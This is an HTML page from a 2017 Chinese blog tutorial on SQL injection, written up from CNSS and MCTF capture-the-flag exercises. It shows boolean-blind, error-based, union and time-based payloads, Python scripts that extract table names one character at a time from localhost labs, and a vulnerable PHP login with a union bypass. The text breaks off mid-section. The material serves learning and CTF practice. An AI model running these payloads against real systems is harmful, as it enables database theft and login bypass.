@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="供cnss交流会课后学习 前排提醒!本文python脚本因为美观都换了行,自己利用的时候自行修改 首先源码丢了github 传送门 直接正文 cnss那道题详情见我博客cnss招新pentest一文 cnss盲注初体验首先用户名出输入admin’ or ‘1’&#x3D;’1’# 返回页面:  再加上页面不会返回数据库的内容,所以考虑盲注(延时也可以,但是返回会不准确,毕竟影响因素多) 首先我们尝">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入学习(加mctf小总结)">
+<meta property="og:url" content="http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="供cnss交流会课后学习 前排提醒!本文python脚本因为美观都换了行,自己利用的时候自行修改 首先源码丢了github 传送门 直接正文 cnss那道题详情见我博客cnss招新pentest一文 cnss盲注初体验首先用户名出输入admin’ or ‘1’&#x3D;’1’# 返回页面:  再加上页面不会返回数据库的内容,所以考虑盲注(延时也可以,但是返回会不准确,毕竟影响因素多) 首先我们尝">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/2017/11/cnss-1.png">
+<meta property="og:image" content="http://example.com/images/2017/11/cnss-2.png">
+<meta property="og:image" content="http://example.com/images/2017/11/cnss-3.png">
+<meta property="og:image" content="http://example.com/images/2017/11/cnss-4.png">
+<meta property="og:image" content="http://example.com/images/2017/11/cnss-5.png">
+<meta property="og:image" content="http://example.com/images/2017/11/cnss-6.png">
+<meta property="og:image" content="http://example.com/images/2017/11/cnss-7.png">
+<meta property="og:image" content="http://example.com/images/2017/11/cnss-8.png">
+<meta property="og:image" content="http://example.com/images/2017/11/cnss-9.png">
+<meta property="article:published_time" content="2017-11-28T19:59:40.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:13:29.442Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2017/11/cnss-1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>sql注入学习(加mctf小总结)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2017/12/10/md5%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2017/11/02/cookie%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&text=sql注入学习(加mctf小总结)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&is_video=false&description=sql注入学习(加mctf小总结)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sql注入学习(加mctf小总结)&body=Check out this article: http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&title=sql注入学习(加mctf小总结)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&name=sql注入学习(加mctf小总结)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/&t=sql注入学习(加mctf小总结)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss%E9%82%A3%E9%81%93%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">cnss那道题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss%E7%9B%B2%E6%B3%A8%E5%88%9D%E4%BD%93%E9%AA%8C"><span class="toc-number">2.</span> <span class="toc-text">cnss盲注初体验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%88%9D%E4%BD%93%E9%AA%8C"><span class="toc-number">3.</span> <span class="toc-text">cnss报错注入初体验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss-union%E6%B3%A8%E5%88%9D%E4%BD%93%E9%AA%8C"><span class="toc-number">4.</span> <span class="toc-text">cnss union注初体验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cnss%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E5%88%9D%E4%BD%93%E9%AA%8C"><span class="toc-number">5.</span> <span class="toc-text">cnss延时注入初体验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MCTF%E6%B3%A8%E5%85%A51"><span class="toc-number">6.</span> <span class="toc-text">MCTF注入1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flappy-bird"><span class="toc-number">7.</span> <span class="toc-text">flappy bird</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        sql注入学习(加mctf小总结)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-11-28T19:59:40.000Z" class="dt-published" itemprop="datePublished">2017-11-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>供cnss交流会课后学习 前排提醒!本文python脚本因为美观都换了行,自己利用的时候自行修改 首先源码丢了github <a target="_blank" rel="noopener" href="https://github.com/blacsheep/sql-injection-practice">传送门</a> 直接正文</p>
+<h3 id="cnss那道题"><a href="#cnss那道题" class="headerlink" title="cnss那道题"></a>cnss那道题</h3><p>详情见我博客cnss招新pentest一文</p>
+<h3 id="cnss盲注初体验"><a href="#cnss盲注初体验" class="headerlink" title="cnss盲注初体验"></a>cnss盲注初体验</h3><p>首先用户名出输入admin’ or ‘1’&#x3D;’1’# 返回页面: <img src="/images/2017/11/cnss-1.png"> 再加上页面不会返回数据库的内容,所以考虑盲注(延时也可以,但是返回会不准确,毕竟影响因素多) <strong>首先</strong>我们尝试去爆表: 帐号:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or ascii(substr((select group_concat(table_name) </span><br><span class="line">from information_schema.tables where table_schema=database()),1,1))=48#</span><br></pre></td></tr></table></figure>
+
+<p>密码随意 如果返回的不为密码错误,就说明后面的表达式是成立的,由此判断出第一个表的第一个字符,通过改变substr 的第二个参数来获取完整表名,通过改limit来获取其他表(或者group_concat也可以,这里用的group_concat) 然后获得表名cnss,flag,user 然后同样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or ascii(substr((select group_concat(column_name) </span><br><span class="line">from information_schema.columns where table_name=&quot;flag&quot;),1,1))=48#</span><br></pre></td></tr></table></figure>
+
+<p>得到列名为flag 最后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or ascii(substr((select flag from flag),1,1))=48#</span><br></pre></td></tr></table></figure>
+
+<p>脚本样例:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">list1=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\&#x27; or ascii(substr((select group_concat(table_name) </span></span><br><span class="line"><span class="string">from information_schema.tables </span></span><br><span class="line"><span class="string">where table_schema=database()),&#123;num&#125;,1))=&#123;ascii1&#125;#&#x27;</span>.<span class="built_in">format</span>(num=num,ascii1=<span class="built_in">ord</span>(each)),</span><br><span class="line">               <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123321&#x27;</span>&#125;</span><br><span class="line">        <span class="comment">#print(data)                       </span></span><br><span class="line">        r=requests.post(<span class="string">&#x27;http://localhost:8080/CNSS/bool.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(each,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag:CNSS{SQl_1njecti0n}</p>
+<h3 id="cnss报错注入初体验"><a href="#cnss报错注入初体验" class="headerlink" title="cnss报错注入初体验"></a>cnss报错注入初体验</h3><p>报错注入的前提是目标开启了错误显示,比如我们帐号输入admin’,得到返回 <img src="/images/2017/11/cnss-2.png"> 那么我们输入 帐号:admin’ and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))# 密码:随意 得到回显 <img src="/images/2017/11/cnss-3.png"> 说明有cnss,flag,user三张表,然后同盲注爆出列和字段 <img src="/images/2017/11/cnss-4.png"> 这里提一个报错注入新姿势,如果知道列名想爆出当前表名,可以使用polygon,比如 <img src="/images/2017/11/cnss-5.png"></p>
+<h3 id="cnss-union注初体验"><a href="#cnss-union注初体验" class="headerlink" title="cnss union注初体验"></a>cnss union注初体验</h3><p>union注入一般用于有回显的地方,直接用union提取出所需要的信息(还可以用于登录时改变密码,后续会提到) 比如我们的union.php里面 <img src="/images/2017/11/cnss-6.png"> 所以我们直接用union提取信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">99&#x27; union select group_concat(table_name) from</span><br><span class="line"> information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p>返回为<img src="/images/2017/11/cnss-7.png"> 后面同盲注的提取方法即可</p>
+<h3 id="cnss延时注入初体验"><a href="#cnss延时注入初体验" class="headerlink" title="cnss延时注入初体验"></a>cnss延时注入初体验</h3><p>延时注入适用的范围很广,主要目标没有过滤函数,而且sql语句得到了执行,那么就可以得到判断 举个栗子<img src="/images/2017/11/cnss-8.png"> 这种就可以延时注入 利用if,if(条件,条件为真的返回,条件为假的返回) 所以我们可以在if里面用盲注的方法来获取信息,但是注意,所得答案可能会受网速影响,多试几次是没问题的 代码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">list1=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select group_concat(table_name)</span></span><br><span class="line"><span class="string">              from information_schema.tables where table_schema=database()</span></span><br><span class="line"><span class="string">              ),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(3),1)#&#x27;.format(num=num,ascii1=ord(each))&#x27;&#x27;&#x27;</span>&#125;</span><br><span class="line">        <span class="comment">#print(data)                          </span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(<span class="string">&#x27;http://localhost:8080/CNSS/sleep.php&#x27;</span>,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(each,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="MCTF注入1"><a href="#MCTF注入1" class="headerlink" title="MCTF注入1"></a>MCTF注入1</h3><p>记录这道题主要是从这道题见识到了一种新的登录代码(原谅我见识少…) <img src="/images/2017/11/cnss-9.png"> 具体代码如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;connect.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/union select/i&#x27;</span>, <span class="variable">$username</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$result</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;username error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$password_now</span> = <span class="variable">$result</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>!=<span class="variable">$password_now</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;password error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中正则只过滤了一个union select是因为我对这个印象比较深刻,是用括号绕过的,所以这里只写了这一个. 然后这个后台是用username来取数据,然后比对password,如果我们用union来提取的话,就可以绕过密码了, 就比如这道题,我们输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union(select 1,1)#</span><br></pre></td></tr></table></figure>
+
+<p>密码填1,然后就没有提示错误了,于是就可以对密码进行盲注. 帐号填</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;union(select 1,(ascii(sub(...))=..))#</span><br></pre></td></tr></table></figure>
+
+<p>密码填1,如果判断正确就没有密码错误的提示,由此进行注入. 然后这道题有个坑,那就是这个表里面没有东西,所以即使你用户名后面and 1&#x3D;1也是报用户名错误…. 我当时就死在了这里…可惜可惜</p>
+<h3 id="flappy-bird"><a href="#flappy-bird" class="headerlink" title="flappy bird"></a>flappy bird</h3><p>这道题本来我都做出来了…我想到了应该是更新分数那个地方可以注入,无奈我不会…所以没有做… 这次补了一下,可以写了.总的来说还是在输入后面加上if然后搞事情吧比如这道flappy bird,这里我改成了update, update的话后面可以</p>
